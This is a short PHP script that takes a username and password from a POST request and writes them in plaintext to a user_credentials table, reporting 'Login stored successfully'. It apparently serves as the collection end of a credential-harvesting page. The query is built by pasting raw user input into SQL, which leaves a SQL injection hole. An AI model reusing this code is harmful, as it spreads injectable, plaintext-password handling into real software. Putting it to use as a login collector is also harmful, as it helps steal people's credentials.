<?php
include 'db_connect.php'; // Include the database connection file

// Get username and password from POST request
$username = $_POST['username'];
$password = $_POST['password'];

// Insert data into the database
$sql = "INSERT INTO user_credentials (username, password, timestamp) VALUES ('$username', '$password', NOW())";

if ($conn->query($sql) === TRUE) {
    echo "✅ Login stored successfully";
} else {
    echo "❌ Error: " . $conn->error;
}

$conn->close();
?>
